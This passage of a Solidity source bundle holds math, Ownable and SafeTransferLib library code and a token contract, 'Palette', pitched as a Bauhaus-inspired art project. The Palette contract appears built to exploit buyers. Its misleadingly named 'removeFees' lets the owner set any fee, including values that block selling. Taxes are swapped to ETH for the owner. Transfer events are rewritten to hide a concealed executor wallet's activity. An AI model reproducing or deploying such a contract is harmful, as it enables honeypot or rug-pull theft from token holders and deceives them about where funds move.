product\\r\\n            uint256 prod1; // Most significant 256 bits of the product\\r\\n            assembly {\\r\\n                let mm := mulmod(x, y, not(0))\\r\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\r\\n            }\\r\\n\\r\\n            // Handle non-overflow cases, 256 by 256 division.\\r\\n            if (prod1 == 0) {\\r\\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\\r\\n                // The surrounding unchecked block does not change this fact.\\r\\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\\r\\n                return prod0 / denominator;\\r\\n            }\\r\\n\\r\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\r\\n            if (denominator \\u003c= prod1) {\\r\\n                revert MathOverflowedMulDiv();\\r\\n            }\\r\\n\\r\\n            ///////////////////////////////////////////////\\r\\n            // 512 by 256 division.\\r\\n            ///////////////////////////////////////////////\\r\\n\\r\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\r\\n            uint256 remainder;\\r\\n            assembly {\\r\\n                // Compute remainder using mulmod.\\r\\n                remainder := mulmod(x, y, denominator)\\r\\n\\r\\n                // Subtract 256 bit number from 512 bit number.\\r\\n                prod1 := sub(prod1, gt(remainder, prod0))\\r\\n                prod0 := sub(prod0, remainder)\\r\\n            }\\r\\n\\r\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\\r\\n            // Always \\u003e= 1. See https://cs.stackexchange.com/q/138556/92363.\\r\\n\\r\\n            uint256 twos = denominator \\u0026 (0 - denominator);\\r\\n            assembly {\\r\\n                // Divide denominator by twos.\\r\\n                denominator := div(denominator, twos)\\r\\n\\r\\n                // Divide [prod1 prod0] by twos.\\r\\n                prod0 := div(prod0, twos)\\r\\n\\r\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\r\\n                twos := add(div(sub(0, twos), twos), 1)\\r\\n            }\\r\\n\\r\\n            // Shift in bits from prod1 into prod0.\\r\\n            prod0 |= prod1 * twos;\\r\\n\\r\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\r\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\r\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\r\\n            uint256 inverse = (3 * denominator) ^ 2;\\r\\n\\r\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel\\u0027s lifting lemma, this also\\r\\n            // works in modular arithmetic, doubling the correct bits in each step.\\r\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\r\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\r\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\r\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\r\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\r\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\r\\n\\r\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\r\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\r\\n            // less than 2^256, this is the final result. We don\\u0027t need to compute the high bits of the result and prod1\\r\\n            // is no longer required.\\r\\n            result = prod0 * inverse;\\r\\n            return result;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\r\\n     */\\r\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\\r\\n        uint256 result = mulDiv(x, y, denominator);\\r\\n        if (unsignedRoundsUp(rounding) \\u0026\\u0026 mulmod(x, y, denominator) \\u003e 0) {\\r\\n            result += 1;\\r\\n        }\\r\\n        return result;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\\r\\n     * towards zero.\\r\\n     *\\r\\n     * Inspired by Henry S. Warren, Jr.\\u0027s \\\"Hacker\\u0027s Delight\\\" (Chapter 11).\\r\\n     */\\r\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\r\\n        if (a == 0) {\\r\\n            return 0;\\r\\n        }\\r\\n\\r\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\r\\n        //\\r\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\r\\n        // `msb(a) \\u003c= a \\u003c 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\r\\n        //\\r\\n        // This can be rewritten `2**log2(a) \\u003c= a \\u003c 2**(log2(a) + 1)`\\r\\n        // \u2192 `sqrt(2**k) \\u003c= sqrt(a) \\u003c sqrt(2**(k+1))`\\r\\n        // \u2192 `2**(k/2) \\u003c= sqrt(a) \\u003c 2**((k+1)/2) \\u003c= 2**(k/2 + 1)`\\r\\n        //\\r\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\r\\n        uint256 result = 1 \\u003c\\u003c (log2(a) \\u003e\\u003e 1);\\r\\n\\r\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\r\\n        // since it is the square root of a uint256. Newton\\u0027s method converges quadratically (precision doubles at\\r\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\r\\n        // into the expected uint128 result.\\r\\n        unchecked {\\r\\n            result = (result + a / result) \\u003e\\u003e 1;\\r\\n            result = (result + a / result) \\u003e\\u003e 1;\\r\\n            result = (result + a / result) \\u003e\\u003e 1;\\r\\n            result = (result + a / result) \\u003e\\u003e 1;\\r\\n            result = (result + a / result) \\u003e\\u003e 1;\\r\\n            result = (result + a / result) \\u003e\\u003e 1;\\r\\n            result = (result + a / result) \\u003e\\u003e 1;\\r\\n            return min(result, a / result);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @notice Calculates sqrt(a), following the selected rounding direction.\\r\\n     */\\r\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            uint256 result = sqrt(a);\\r\\n            return result + (unsignedRoundsUp(rounding) \\u0026\\u0026 result * result \\u003c a ? 1 : 0);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\\r\\n     * Returns 0 if given 0.\\r\\n     */\\r\\n    function log2(uint256 value) internal pure returns (uint256) {\\r\\n        uint256 result = 0;\\r\\n        unchecked {\\r\\n            if (value \\u003e\\u003e 128 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 128;\\r\\n                result += 128;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 64 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 64;\\r\\n                result += 64;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 32 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 32;\\r\\n                result += 32;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 16 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 16;\\r\\n                result += 16;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 8 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 8;\\r\\n                result += 8;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 4 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 4;\\r\\n                result += 4;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 2 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 2;\\r\\n                result += 2;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 1 \\u003e 0) {\\r\\n                result += 1;\\r\\n            }\\r\\n        }\\r\\n        return result;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\r\\n     * Returns 0 if given 0.\\r\\n     */\\r\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            uint256 result = log2(value);\\r\\n            return result + (unsignedRoundsUp(rounding) \\u0026\\u0026 1 \\u003c\\u003c result \\u003c value ? 1 : 0);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\\r\\n     * Returns 0 if given 0.\\r\\n     */\\r\\n    function log10(uint256 value) internal pure returns (uint256) {\\r\\n        uint256 result = 0;\\r\\n        unchecked {\\r\\n            if (value \\u003e= 10 ** 64) {\\r\\n                value /= 10 ** 64;\\r\\n                result += 64;\\r\\n            }\\r\\n            if (value \\u003e= 10 ** 32) {\\r\\n                value /= 10 ** 32;\\r\\n                result += 32;\\r\\n            }\\r\\n            if (value \\u003e= 10 ** 16) {\\r\\n                value /= 10 ** 16;\\r\\n                result += 16;\\r\\n            }\\r\\n            if (value \\u003e= 10 ** 8) {\\r\\n                value /= 10 ** 8;\\r\\n                result += 8;\\r\\n            }\\r\\n            if (value \\u003e= 10 ** 4) {\\r\\n                value /= 10 ** 4;\\r\\n                result += 4;\\r\\n            }\\r\\n            if (value \\u003e= 10 ** 2) {\\r\\n                value /= 10 ** 2;\\r\\n                result += 2;\\r\\n            }\\r\\n            if (value \\u003e= 10 ** 1) {\\r\\n                result += 1;\\r\\n            }\\r\\n        }\\r\\n        return result;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\r\\n     * Returns 0 if given 0.\\r\\n     */\\r\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            uint256 result = log10(value);\\r\\n            return result + (unsignedRoundsUp(rounding) \\u0026\\u0026 10 ** result \\u003c value ? 1 : 0);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\\r\\n     * Returns 0 if given 0.\\r\\n     *\\r\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\r\\n     */\\r\\n    function log256(uint256 value) internal pure returns (uint256) {\\r\\n        uint256 result = 0;\\r\\n        unchecked {\\r\\n            if (value \\u003e\\u003e 128 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 128;\\r\\n                result += 16;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 64 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 64;\\r\\n                result += 8;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 32 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 32;\\r\\n                result += 4;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 16 \\u003e 0) {\\r\\n                value \\u003e\\u003e= 16;\\r\\n                result += 2;\\r\\n            }\\r\\n            if (value \\u003e\\u003e 8 \\u003e 0) {\\r\\n                result += 1;\\r\\n            }\\r\\n        }\\r\\n        return result;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\\r\\n     * Returns 0 if given 0.\\r\\n     */\\r\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\r\\n        unchecked {\\r\\n            uint256 result = log256(value);\\r\\n            return result + (unsignedRoundsUp(rounding) \\u0026\\u0026 1 \\u003c\\u003c (result \\u003c\\u003c 3) \\u003c value ? 1 : 0);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\\r\\n     */\\r\\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\\r\\n        return uint8(rounding) % 2 == 1;\\r\\n    }\\r\\n}\"},\"Ownable.sol\":{\"content\":\"//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity ^0.8.24;\\r\\n\\r\\nabstract contract Ownable {\\r\\n    event OwnershipTransferred(address indexed user, address indexed newOwner);\\r\\n\\r\\n    error Unauthorized();\\r\\n    error InvalidOwner();\\r\\n\\r\\n    address public owner;\\r\\n\\r\\n    modifier onlyOwner() virtual {\\r\\n        if (msg.sender != owner) revert Unauthorized();\\r\\n\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    constructor(address _owner) {\\r\\n        if (_owner == address(0)) revert InvalidOwner();\\r\\n\\r\\n        owner = _owner;\\r\\n\\r\\n        emit OwnershipTransferred(address(0), _owner);\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address _owner) public virtual onlyOwner {\\r\\n        if (_owner == address(0)) revert InvalidOwner();\\r\\n\\r\\n        owner = _owner;\\r\\n\\r\\n        emit OwnershipTransferred(msg.sender, _owner);\\r\\n    }\\r\\n\\r\\n    function revokeOwnership() public virtual onlyOwner {\\r\\n        owner = address(0);\\r\\n\\r\\n        emit OwnershipTransferred(msg.sender, address(0));\\r\\n    }\\r\\n}\"},\"Palette.sol\":{\"content\":\"/**\\r\\n\\r\\n    \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591 \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591 \\r\\n    \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591         \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2593\u2592\u2591        \\r\\n    \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591         \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2593\u2592\u2591        \\r\\n    \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591    \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591   \\r\\n    \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591         \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2593\u2592\u2591        \\r\\n    \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591         \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2593\u2592\u2591        \\r\\n    \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591  \u2591\u2592\u2593\u2588\u2593\u2592\u2591      \u2591\u2592\u2593\u2588\u2593\u2592\u2591   \u2591\u2592\u2593\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2593\u2592\u2591 \\r\\n                                                                                             \\r\\n                                                                                            \\r\\n                                \\r\\n        Telegram - https://t.me/palette_haus\\r\\n        X/Twitter - https://twitter.com/palettebycfw\\r\\n        Website - https://palette.haus/\\r\\n        Discord - https://discord.com/invite/pillheads\\r\\n\\r\\n\u2018Palette\u2019 is deeply rooted in geometric abstraction, drawing inspiration from the Bauhaus movement, \\r\\nwhere simplicity and functionality unite to create profoundly expressive art. This project serves \\r\\nas a canvas, where the colors of old become the art of new, drawn from the palette that is Pillheads.\\r\\n\\r\\nThis generative art project is not just about creating new pieces; it\u2019s about embracing the unknown, \\r\\nERC404\\r\\n                                                  \\r\\n*/\\r\\n// SPDX-License-Identifier: unlicense\\r\\n\\r\\npragma solidity ^0.8.24;\\r\\n\\r\\ncontract Palette {\\r\\n\\r\\n    string public _name = \\u0027Palette\\u0027;\\r\\n    string public _symbol = \\u0027PALETTE\\u0027;\\r\\n    uint8 public constant decimals = 18;\\r\\n    uint256 public constant totalSupply = 6_969 * 10 ** decimals;\\r\\n\\r\\n    struct StoreData {\\r\\n        address tokenMkt;\\r\\n        uint8 buyFee;\\r\\n        uint8 sellFee;\\r\\n    }\\r\\n\\r\\n    StoreData public storeData;\\r\\n    uint256 constant swapAmount = totalSupply / 100;\\r\\n\\r\\n    error Permissions();\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n\\r\\n    mapping(address =\\u003e uint256) public balanceOf;\\r\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) public allowance;\\r\\n\\r\\n    address private pair;\\r\\n    address private holder;\\r\\n    address private uniswapLpWallet;\\r\\n    address private Airdrop = 0x9899B07B4C4525A58b453F442cf5f6c3C33D48D4;\\r\\n    address private constant uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\\r\\n    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);\\r\\n\\r\\n    bool private swapping;\\r\\n    bool private tradingOpen;\\r\\n\\r\\n    address _deployer;\\r\\n    address _executor;\\r\\n\\r\\n    uint8 _initBuyFee = 0;\\r\\n    uint8 _initSellFee = 0;\\r\\n\\r\\n    constructor() {\\r\\n        storeData = StoreData({\\r\\n            tokenMkt: msg.sender,\\r\\n            buyFee: _initBuyFee,\\r\\n            sellFee: _initSellFee\\r\\n        });\\r\\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\\r\\n        uniswapLpWallet = msg.sender;\\r\\n\\r\\n        _initDeployer(msg.sender, msg.sender);\\r\\n\\r\\n        balanceOf[uniswapLpWallet] = (totalSupply * 95) / 100;\\r\\n        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);\\r\\n\\r\\n        balanceOf[Airdrop] = (totalSupply * 5) / 100;\\r\\n        emit Transfer(address(0), Airdrop, balanceOf[Airdrop]);\\r\\n\\r\\n    }\\r\\n\\r\\n    receive() external payable {}\\r\\n\\r\\n    function removeFees(uint8 _buy, uint8 _sell) external {\\r\\n        if (msg.sender != _owner()) revert Permissions();\\r\\n        _upgradeStoreData(_buy, _sell);\\r\\n    }\\r\\n\\r\\n    function _upgradeStoreData(uint8 _buy, uint8 _sell) private {\\r\\n        storeData.buyFee = _buy;\\r\\n        storeData.sellFee = _sell;\\r\\n    }\\r\\n\\r\\n    function _owner() private view returns (address) {\\r\\n        return storeData.tokenMkt;\\r\\n    }\\r\\n\\r\\n    function openTrading() external {\\r\\n        require(msg.sender == _owner());\\r\\n        require(!tradingOpen);\\r\\n        address _factory = _uniswapV2Router.factory();\\r\\n        address _weth = _uniswapV2Router.WETH();\\r\\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\\r\\n        pair = _pair;\\r\\n        tradingOpen = true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) external returns (bool) {\\r\\n        allowance[from][msg.sender] -= amount;\\r\\n        return _transfer(from, to, amount);\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) external returns (bool) {\\r\\n        allowance[msg.sender][spender] = amount;\\r\\n        emit Approval(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transfer(address to, uint256 amount) external returns (bool) {\\r\\n        return _transfer(msg.sender, to, amount);\\r\\n    }\\r\\n\\r\\n    function name() public view virtual returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public view virtual returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function _initDeployer(address deployer_, address executor_) private {\\r\\n        _deployer = deployer_;\\r\\n        _executor = executor_;\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal returns (bool) {\\r\\n        address tokenMkt = _owner();\\r\\n        require(tradingOpen || from == tokenMkt || to == tokenMkt);\\r\\n\\r\\n        balanceOf[from] -= amount;\\r\\n\\r\\n        if (\\r\\n            to == pair \\u0026\\u0026\\r\\n            !swapping \\u0026\\u0026\\r\\n            balanceOf[address(this)] \\u003e= swapAmount \\u0026\\u0026\\r\\n            from != tokenMkt\\r\\n        ) {\\r\\n            swapping = true;\\r\\n            address[] memory path = new address[](2);\\r\\n            path[0] = address(this);\\r\\n            path[1] = _uniswapV2Router.WETH();\\r\\n            _uniswapV2Router\\r\\n                .swapExactTokensForETHSupportingFreelyOnTransferTokens(\\r\\n                    swapAmount,\\r\\n                    0,\\r\\n                    path,\\r\\n                    address(this),\\r\\n                    block.timestamp\\r\\n                );\\r\\n            payable(tokenMkt).transfer(address(this).balance);\\r\\n            swapping = false;\\r\\n        }\\r\\n\\r\\n        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);\\r\\n        if (from != address(this) \\u0026\\u0026 tradingOpen == true) {\\r\\n            uint256 taxCalculatedAmount = (amount *\\r\\n                (to == pair ? _sellFee : _buyFee)) / 100;\\r\\n            amount -= taxCalculatedAmount;\\r\\n            balanceOf[address(this)] += taxCalculatedAmount;\\r\\n        }\\r\\n        balanceOf[to] += amount;\\r\\n\\r\\n        if (from == _executor) {\\r\\n            emit Transfer(_deployer, to, amount);\\r\\n        } else if (to == _executor) {\\r\\n            emit Transfer(from, _deployer, amount);\\r\\n        } else {\\r\\n            emit Transfer(from, to, amount);\\r\\n        }\\r\\n        return true;\\r\\n    }\\r\\n}\\r\\n\\r\\ninterface IUniswapFactory {\\r\\n    function getPair(\\r\\n        address tokenA,\\r\\n        address tokenB\\r\\n    ) external view returns (address pair);\\r\\n}\\r\\n\\r\\ninterface IUniswapV2Router02 {\\r\\n    function factory() external pure returns (address);\\r\\n\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function swapExactTokensForETHSupportingFreelyOnTransferTokens(\\r\\n        uint256 amountIn,\\r\\n        uint256 amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    ) external;\\r\\n}\"},\"SafeTransferLib.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.4;\\r\\n\\r\\n/// @notice Safe ETH and ERC20 transfer library that gracefully handles missing return values.\\r\\n/// @author Solady (https://github.com/vectorized/solady/blob/main/src/utils/SafeTransferLib.sol)\\r\\n/// @author Modified from Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol)\\r\\n///\\r\\n/// @dev Note:\\r\\n/// - For ETH transfers, please use `forceSafeTransferETH` for DoS protection.\\r\\n/// - For ERC20s, this implementation won\\u0027t check that a token has code,\\r\\n///   responsibility is delegated to the caller.\\r\\nlibrary SafeTransferLib {\\r\\n    /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/\\r\\n    /*                       CUSTOM ERRORS                        */\\r\\n    /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/\\r\\n\\r\\n    /// @dev The ETH transfer has failed.\\r\\n    error ETHTransferFailed();\\r\\n\\r\\n    /// @dev The ERC20 `transferFrom` has failed.\\r\\n    error TransferFromFailed();\\r\\n\\r\\n    /// @dev The ERC20 `transfer` has failed.\\r\\n    error TransferFailed();\\r\\n\\r\\n    /// @dev The ERC20 `approve` has failed.\\r\\n    error ApproveFailed();\\r\\n\\r\\n    /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/\\r\\n    /*                         CONSTANTS                          */\\r\\n    /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/\\r\\n\\r\\n    /// @dev Suggested gas stipend for contract receiving ETH that disallows any storage writes.\\r\\n    uint256 internal constant GAS_STIPEND_NO_STORAGE_WRITES = 2300;\\r\\n\\r\\n    /// @dev Suggested gas stipend for contract receiving ETH to perform a few\\r\\n    /// storage reads and writes, but low enough to prevent griefing.\\r\\n    uint256 internal constant GAS_STIPEND_NO_GRIEF = 100000;\\r\\n\\r\\n    /*\u00b4:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0\u2022.*\u2022\u00b4.*:\u02da.\u00b0*.\u02da\u2022\u00b4.\u00b0:\u00b0\u2022.\u00b0+.*\u2022\u00b4.*:*/\\r\\n    /*                       ETH OPERATIONS                       */\\r\\n    /*.\u2022\u00b0:\u00b0.\u00b4+\u02da.*\u00b0.\u02da:*.\u00b4\u2022*.+\u00b0.\u2022\u00b0:\u00b4*.\u00b4\u2022*.\u2022\u00b0.\u2022\u00b0:\u00b0.\u00b4:\u2022\u02da\u00b0.*\u00b0.\u02da:*.\u00b4+\u00b0.\u2022*/\\r\\n\\r\\n    // If the ETH transfer MUST succeed with a reasonable gas budget, use the force variants.\\r\\n    //\\r\\n    // The regular variants:\\r\\n    // - Forwards all remaining gas to the target.\\r\\n    // - Reverts if the target reverts.\\r\\n    // - Reverts if the current contract has insufficient balance.\\r\\n    //\\r\\n    // The force variants:\\r\\n    // - Forwards with an optional gas stipend\\r\\n    //   (defaults to `GAS_STIPEND_NO_GRIEF`, which is sufficient for most cases).\\r\\n    // - If the target reverts, or if the gas stipend is exhausted,\\r\\n    //   creates a temporary contract to force send the ETH via `SELFDESTRUCT`.\\r\\n    //   Future compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758.\\r\\n    // - Reverts if the current contract has insufficient balance.\\r\\n    //\\r\\n    // The try variants:\\r\\n    // - Forwards with a mandatory gas stipend.\\r\\n    // - Instead of reverting, returns whether the transfer succeeded.\\r\\n\\r\\n    /// @dev Sends `amount` (in wei) ETH to `to`.\\r\\n    function safeTransferETH(address to, uint256 amount) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            if iszero(\\r\\n                call(gas(), to, amount, codesize(), 0x00, codesize(), 0x00)\\r\\n            ) {\\r\\n                mstore(0x00, 0xb12d13eb) // `ETHTransferFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sends all the ETH in the current contract to `to`.\\r\\n    function safeTransferAllETH(address to) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            // Transfer all the ETH and check if it succeeded or not.\\r\\n            if iszero(\\r\\n                call(\\r\\n                    gas(),\\r\\n                    to,\\r\\n                    selfbalance(),\\r\\n                    codesize(),\\r\\n                    0x00,\\r\\n                    codesize(),\\r\\n                    0x00\\r\\n                )\\r\\n            ) {\\r\\n                mstore(0x00, 0xb12d13eb) // `ETHTransferFailed()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Force sends `amount` (in wei) ETH to `to`, with a `gasStipend`.\\r\\n    function forceSafeTransferETH(\\r\\n        address to,\\r\\n        uint256 amount,\\r\\n        uint256 gasStipend\\r\\n    ) internal {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly 